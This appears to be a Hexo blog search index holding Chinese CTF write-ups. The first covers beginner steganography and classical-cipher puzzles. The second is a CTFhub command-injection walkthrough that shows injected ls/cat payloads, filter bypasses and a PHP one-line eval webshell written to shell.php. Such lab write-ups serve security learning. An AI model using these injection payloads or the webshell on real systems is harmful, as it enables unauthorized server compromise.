<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF周赛</title>
    <url>/2021/06/05/CTF-%E5%86%85%E9%83%A8%E5%91%A8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="看看你的刷新键是什么？"><a href="#看看你的刷新键是什么？" class="headerlink" title="看看你的刷新键是什么？"></a>看看你的刷新键是什么？</h1><p><img src="https://img-blog.csdnimg.cn/202103211932014.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示下载工具：F5-steganography<br>打开题目：<img src="https://img-blog.csdnimg.cn/20210321193447295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们需要使用：F5-steganography查看使用方法<br><img src="https://img-blog.csdnimg.cn/20210321193829849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321194008521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>生成一个文件得到flag:<br><img src="https://img-blog.csdnimg.cn/20210321194550427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="字节中遇见你"><a href="#字节中遇见你" class="headerlink" title="字节中遇见你"></a>字节中遇见你</h1><p><img src="https://img-blog.csdnimg.cn/20210321194628461.png" alt="在这里插入图片描述"><br>更改格式为zip<img src="https://img-blog.csdnimg.cn/20210321194731847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用010 Editor打开查找flag相关的字节<img src="https://img-blog.csdnimg.cn/20210321194906277.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321194930359.png" alt="在这里插入图片描述"><br>有两个答案根据提示第一个是错误的，即第二个就是本题的答案：SL{cool_getflag}</p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="https://img-blog.csdnimg.cn/20210321195117414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件<br><img src="https://img-blog.csdnimg.cn/20210321195228763.png" alt="在这里插入图片描述"><br>更改格式为ZIP，得到图片<br><img src="https://img-blog.csdnimg.cn/20210321195307163.png" alt="在这里插入图片描述"><br>根据提示查看图片的属性，得到flag<br><img src="https://img-blog.csdnimg.cn/20210321195351979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h1><p><img src="https://img-blog.csdnimg.cn/20210321195515210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321195547257.png" alt="在这里插入图片描述"><br>更改格式<img src="https://img-blog.csdnimg.cn/20210321195633399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据文本的名字对应字符串即想到ascii码表对应表：将前四个字符对应flag既可以发现规律<img src="https://img-blog.csdnimg.cn/20210321200438915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>W-f相差15，^–l相差14，T-a相差13依次往下推，相应的字符加上对应的数值既可以得到flag{easy_M1sc}</p>
<h1 id="五-看你认真不认真"><a href="#五-看你认真不认真" class="headerlink" title="五.看你认真不认真"></a>五.看你认真不认真</h1><p><img src="https://img-blog.csdnimg.cn/20210321201303924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个题，额有点小技巧把看不懂英文就翻译一下<img src="https://img-blog.csdnimg.cn/20210321201412998.png" alt="在这里插入图片描述"><br>好滴，打开网站的标识<img src="https://img-blog.csdnimg.cn/20210321201509628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag:SL{something_h3re!}</p>
<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p><img src="https://img-blog.csdnimg.cn/20210321201654199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321201802914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开记事本，复制文本内容到word中搜索flag关键字：<img src="https://img-blog.csdnimg.cn/20210321202136106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{hello_world_gogogo}</p>
<h1 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h1><p><img src="https://img-blog.csdnimg.cn/20210321202250995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321202305899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见该题考察的是对源代码查看的使用，F12和右键没办法使用就就进入开发者模式查看<img src="https://img-blog.csdnimg.cn/20210321202415556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{U0x7VGhpc19pNF9mbGFnIX0}</p>
<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p><img src="https://img-blog.csdnimg.cn/20210321202511574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开图片查看属性：<img src="https://img-blog.csdnimg.cn/20210321202603595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到字符串，根据题目这是一个古典密码经过不断尝试，这是需要使用凯撒密码去解题，位移是：6别问我为什么，前四个肯定是flag，问就是试到6之后刚好是flag<img src="https://img-blog.csdnimg.cn/2021032120342957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="变形的猪圈密码"><a href="#变形的猪圈密码" class="headerlink" title="变形的猪圈密码"></a>变形的猪圈密码</h1><p><img src="https://img-blog.csdnimg.cn/2021032120345356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210321203503799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据变形的猪圈密码去解密<img src="https://img-blog.csdnimg.cn/2021032120362456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一个个图形去对照既可以得到flag</p>
<h1 id="ROT-不仅仅是base"><a href="#ROT-不仅仅是base" class="headerlink" title="ROT(不仅仅是base)"></a>ROT(不仅仅是base)</h1><p><img src="https://img-blog.csdnimg.cn/20210321203715372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目本题需要用到：ROT13解密、base64、栅栏解密，至于顺序则需要不断尝试了。<br>这里是：栅栏解密-base64-ROT13<br>六只小猪即字数为6<img src="https://img-blog.csdnimg.cn/20210321204443242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64:<img src="https://img-blog.csdnimg.cn/20210321204502786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ROT13:<img src="https://img-blog.csdnimg.cn/20210321204528126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{shangxiaoyuanandguanlulu}</p>
<h1 id="不仅仅是MD5"><a href="#不仅仅是MD5" class="headerlink" title="不仅仅是MD5"></a>不仅仅是MD5</h1><p><img src="https://img-blog.csdnimg.cn/20210321204625315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示兔子可知需要使用rabbit解密<br><img src="https://img-blog.csdnimg.cn/20210321204936965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后是MD5解密<br><img src="https://img-blog.csdnimg.cn/20210321205057877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{good-luck}</p>
]]></content>
  </entry>
  <entry>
    <title>CTFhub-RCE</title>
    <url>/2021/06/05/CTFhub-RCE/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">




<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>在开始之前我们进行一些简单的了解，其实我也是做题做到后面才发现一些知识是必要去掌握的🧚‍♂️🧚‍♀️🧛‍♀️🧛‍♂️🧜‍♀️🧜‍♀️</p>
<p><strong>知识点-这里最好了解一下</strong><br>RCE分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：==没有在输入口做输入处理==。</p>
<ol>
<li>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。</li>
<li>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。</li>
<li>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</li>
</ol>
<p>其中对于不同系统的命令指示又有着不同的命令符：</p>
<h2 id="对于Windows系统"><a href="#对于Windows系统" class="headerlink" title="对于Windows系统"></a>对于Windows系统</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span> “|”：直接执行后面的语句。<br><span class="hljs-number">2.</span> “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br><span class="hljs-number">3.</span> “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br><span class="hljs-number">4.</span> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
<h2 id="对于Linux系统"><a href="#对于Linux系统" class="headerlink" title="对于Linux系统"></a>对于Linux系统</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">. “;”：执行完前面的语句再执行后面的语句。<br>. “|”：显示后面语句的执行结果。<br>. “||”：当前面的语句执行出错时，执行后面的语句。<br>. “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>. “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><img src="https://img-blog.csdnimg.cn/20210531185857597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然提示输入IP让我们输入本地试试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531190028865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到显示后，尝试得到该路径下文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531190212498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取文件内容信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat <span class="hljs-number">120731029228103.</span>php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531190322528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有结果，这里可能是文件中包含特殊符号，使用管道运行base64加密内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat *.php | base64<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021053119055310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>尝试base64解密<br><img src="https://img-blog.csdnimg.cn/20210531190811336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里还有第二种方法，利用命令执行写入一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
<p>因为环境问题，昨天还可以今天就不行了，但是方法是可行的！👀👀</p>
<h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><p>本文开始前先贴出一些小知识：<br><strong>linux查看文本的命令</strong></p>
<ul>
<li><code>cat</code> 由第一行开始显示内容，并将所有内容输出</li>
<li><code>tac</code> 从最后一行倒序显示内容，并将所有内容输出</li>
<li><code>more</code> 根据窗口大小，一页一页的现实文件内容</li>
<li><code>less</code> 和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
<li><code>head</code> 只显示头几行</li>
<li><code>tail</code> 只显示最后几行</li>
<li><code>nl</code> 类似于cat -n，显示时输出行号</li>
<li><code>tailf</code> 类似于tail -f</li>
</ul>
<p>==showtime==<br><img src="https://img-blog.csdnimg.cn/20210531192646843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据上题的思路继续进行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531192723973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>检索目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531192752601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先试试cat是否可以使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;cat flag_30210295964775.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531192837961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好吧看来是不行了<br>试试上一题讲到的一句话木马上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531193315676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/20210531193424176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p><img src="https://img-blog.csdnimg.cn/20210531193640916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>过滤空格可以使用<code>/**/</code> 或者<code>&lt;</code>代替</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>ls<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531193801505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat进行获取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>cat<span class="hljs-comment">/**/</span>flag_12333170278981.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531193941753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有结果，获取flag文件下base64密文</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|cat&lt;flag_12333170278981.php|base64<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531194622505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密<img src="https://img-blog.csdnimg.cn/20210531194653251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h1><p><img src="https://img-blog.csdnimg.cn/20210531201230521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题思路：<br>1、既然<code>’/‘</code>无法使用那我们可以使用cd 进入文件夹中<br>2、对管道进行使用base64加密</p>
<p>按照惯例对题目文件目录进行查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531201501482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>cd进入文件目录</strong><br>cd  进入flag_is_here目录，<br>ls  显示flag_is_here目录里的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;ls<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531201656332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进入该文件中获取信息</strong><br>1、<code>cd</code> 进入文件<br>2、<code>cat</code> 获取文件内容<br>3、<code>base64</code>进行加密显示内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;cat flag_11328226429806.php|base64<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531202030482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解密<img src="https://img-blog.csdnimg.cn/20210531202106484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p><img src="https://img-blog.csdnimg.cn/2021053120381879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol>
<li>这里过滤了，<code>|和&amp;</code>两个运算符，这两种运算符在这里是无法执行后面的命令</li>
<li>没事问题不大👩‍💻👩‍💻👨‍💻👨‍💻我们可以使用<code>；</code>分隔运算符进行命令</li>
</ol>
<p><strong>老样子，先检索目录吧</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;ls<br></code></pre></td></tr></table></figure>
